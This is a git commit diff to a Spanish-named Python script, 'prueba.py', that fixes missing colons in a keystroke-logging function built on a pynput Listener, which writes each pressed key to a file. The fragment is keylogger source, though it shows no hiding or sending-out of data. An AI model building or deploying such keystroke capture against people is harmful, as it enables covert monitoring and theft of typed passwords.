3107162855c743c9b657b5eba03af39313c6d3f4
ZXDe <43547674+ZXDe@users.noreply.github.com>
2020-07-29 22:16:27 -0500

    Update prueba.py

--- prueba.py
+++ prueba.py
@@ -14,11 +14,10 @@ def key_recorder(key):
         f.write(' ')
     elif key =='Key.backspace':
         f.write('%BORRAR%')
-    elif key =='<65027>'
+    elif key =='<65027>':
         f.write('alt gr')
-    elif key =='Key.shift_r'
+    elif key =='Key.shift_r':
         f.write('Shift Derecho')
-    elif key =='
 
 with Listener(on_press=key_recorder) as l:
     l.join()
